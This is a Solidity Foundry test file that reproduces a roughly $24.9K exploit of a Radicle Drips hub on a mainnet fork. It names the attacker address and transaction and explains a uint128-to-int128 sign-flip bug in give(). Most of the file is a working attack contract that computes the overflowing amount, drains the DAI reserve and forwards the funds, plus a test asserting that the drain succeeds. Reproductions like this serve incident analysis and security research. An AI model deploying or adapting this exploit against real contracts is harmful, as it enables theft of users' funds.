// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$24.9K
// Attacker : 0x84dA7a5e2315Eb798f04B75554AeB15047269CCE
// Attack Contract : 0x00c64B5a926ba1fceC30EfaD88C344c619F54F12
// Vulnerable Contract : 0x73043143e0A6418cc45d82D4505B096b802FD365
// Attack Tx : 0xc38a6e2259a85ced94238a0b0a49697992f2a6b8140c28f3fd2343d3d8434130
// Analysis : https://anomly.rs/radicle-drips-hub-int128-sign-flip
//
// @Analysis
// give() casts a caller-controlled uint128 to int128 and negates it. Values above int128.max
// wrap negative before negation, turning a deposit into a reserve withdrawal.

interface IDai {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address dst,
        uint256 wad
    ) external returns (bool);
}

interface IDaiReserve {
    function balance() external view returns (uint256);
    function user() external view returns (address);
}

interface IDaiDripsHub {
    function give(
        address receiver,
        uint128 amt
    ) external;
    function reserve() external view returns (address);
    function paused() external view returns (bool);
}

contract ReconstructedRadicleAttack {
    IDaiDripsHub private immutable hub;
    IDaiReserve private immutable reserve;
    IDai private immutable dai;
    address private immutable receiver;

    constructor(
        address hub_,
        address reserve_,
        address dai_,
        address receiver_
    ) {
        hub = IDaiDripsHub(hub_);
        reserve = IDaiReserve(reserve_);
        dai = IDai(dai_);
        receiver = receiver_;
    }

    receive() external payable {}

    function attack(
        address tokenHolder
    ) external payable returns (uint256 reserveBefore, uint128 signFlipAmount, uint256 forwarded) {
        reserveBefore = reserve.balance();
        require(reserveBefore <= type(uint128).max, "reserve too large");

        unchecked {
            signFlipAmount = type(uint128).max - uint128(reserveBefore) + 1;
        }

        hub.give(receiver, signFlipAmount);

        forwarded = dai.balanceOf(address(this));
        require(dai.transfer(tokenHolder, forwarded), "DAI forward failed");
    }
}

contract DripsNetworkExp is Test {
    bytes32 private constant FOCAL_TX = 0xc38a6e2259a85ced94238a0b0a49697992f2a6b8140c28f3fd2343d3d8434130;
    uint256 private constant FOCAL_BLOCK = 25_529_927;

    address private constant ATTACKER = 0x84dA7a5e2315Eb798f04B75554AeB15047269CCE;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant HUB = 0x73043143e0A6418cc45d82D4505B096b802FD365;
    address private constant IMPLEMENTATION = 0x8d321e80487356c846F34456d31cE761776eF697;
    address private constant RESERVE = 0xF9BBb2dF44cfe46e501cf91c99B2f8FeF9D9d44A;
    address private constant TRACE_RECEIVER = 0x962f827743078B18cf437f1DeEA721b42dD19F8c;

    uint256 private constant TRACE_DRAINED_DAI = 24_882_995_421_947_667_857_715;
    uint128 private constant TRACE_GIVE_AMOUNT = 340_282_366_920_938_438_580_379_185_484_100_353_741;

    IDai private constant dai = IDai(DAI);
    IDaiReserve private constant reserve = IDaiReserve(RESERVE);
    IDaiDripsHub private constant hub = IDaiDripsHub(HUB);

    function setUp() public {
        vm.createSelectFork("mainnet", FOCAL_TX);
    }

    function testSignFlipGiveDrainsDaiReserve() public {
        assertEq(block.number, FOCAL_BLOCK, "fork did not anchor to focal block");
        assertEq(hub.reserve(), RESERVE, "hub reserve");
        assertFalse(hub.paused(), "hub paused");
        assertEq(reserve.user(), HUB, "reserve user");

        uint256 attackerBefore = dai.balanceOf(ATTACKER);
        uint256 reserveTokenBefore = dai.balanceOf(RESERVE);
        uint256 reserveAccountingBefore = reserve.balance();

        emit log_named_address("hub implementation", IMPLEMENTATION);
        emit log_named_address("attacker", ATTACKER);
        emit log_named_uint("reserve accounting before", reserveAccountingBefore);
        emit log_named_uint("reserve DAI before", reserveTokenBefore);
        emit log_named_uint("attacker DAI before", attackerBefore);

        assertEq(reserveAccountingBefore, TRACE_DRAINED_DAI, "reserve accounting baseline");
        assertEq(reserveTokenBefore, TRACE_DRAINED_DAI, "reserve token baseline");

        ReconstructedRadicleAttack attackContract = new ReconstructedRadicleAttack(HUB, RESERVE, DAI, TRACE_RECEIVER);
        emit log_named_address("reconstructed attack contract", address(attackContract));

        vm.deal(ATTACKER, 1 ether);
        vm.prank(ATTACKER);
        (uint256 observedReserve, uint128 signFlipAmount, uint256 forwarded) =
            attackContract.attack{value: 0.02 ether}(ATTACKER);

        uint256 attackerAfter = dai.balanceOf(ATTACKER);
        uint256 reserveTokenAfter = dai.balanceOf(RESERVE);
        uint256 reserveAccountingAfter = reserve.balance();
        uint256 attackContractAfter = dai.balanceOf(address(attackContract));

        emit log_named_uint("observed reserve", observedReserve);
        emit log_named_uint("sign-flipped give amount", signFlipAmount);
        emit log_named_uint("forwarded DAI", forwarded);
        emit log_named_uint("reserve accounting after", reserveAccountingAfter);
        emit log_named_uint("reserve DAI after", reserveTokenAfter);
        emit log_named_uint("attacker DAI after", attackerAfter);
        emit log_named_uint("attack contract DAI after", attackContractAfter);

        assertEq(observedReserve, TRACE_DRAINED_DAI, "observed reserve");
        assertEq(signFlipAmount, TRACE_GIVE_AMOUNT, "give calldata amount");
        assertEq(forwarded, TRACE_DRAINED_DAI, "forwarded DAI");
        assertEq(reserveAccountingAfter, 0, "reserve accounting not drained");
        assertEq(reserveTokenAfter, 0, "reserve DAI not drained");
        assertEq(attackContractAfter, 0, "attack contract should end flat");
        assertEq(attackerAfter - attackerBefore, TRACE_DRAINED_DAI, "attacker DAI gain");
    }
}
